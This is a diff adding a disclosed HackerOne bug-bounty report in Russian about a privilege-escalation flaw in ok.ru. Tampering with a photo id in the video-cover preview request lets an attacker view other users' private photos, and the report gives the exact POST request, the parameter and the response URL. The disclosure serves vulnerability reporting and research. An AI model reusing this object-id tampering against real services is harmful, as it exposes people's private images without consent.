@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/78516
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/4lemon
+ReportedTo:ok.ru(ok)
+BountyAmount:200.0
+Severity:
+State:Closed
+DateOfDisclosure:29.04.2016 9:58:46
+
+Summary:
+
+При выборе обложки видео происходит запрос:
+
+>POST /dk?cmd=CustomCoverPreview&st.a.hookId=160344447&st.a.objectId=customCover_31471307517
+
+>st.a.attachedIds=%5B%7B%22type%22%3A%22PHOTOODKL%22%2C%22id%22%3A%22803633705029%22%7D%5D&gwt.requested=129bff65
+
+Подменяя id фотографии в параметре st.a.attachedIds в теле ответа получаем урл:
+http://pimg.mycdn.me/getImage?disableStub=true&type=VIDEO_S_288&url=http%3A%2F%2Fitd1.mycdn.me%2Fimage%3Ft%3D50%26bid%3D803633705029%26id%3D803633705029%26plc%3DWEB%26tkn%3DijQhFLoZF4a893ZE5lZS0e_E5MM&signatureToken=TNH2WJhWuKD1w_lgzlUBDQ
+В котором в слегка обрезанном виде получаем приватную фотографию.
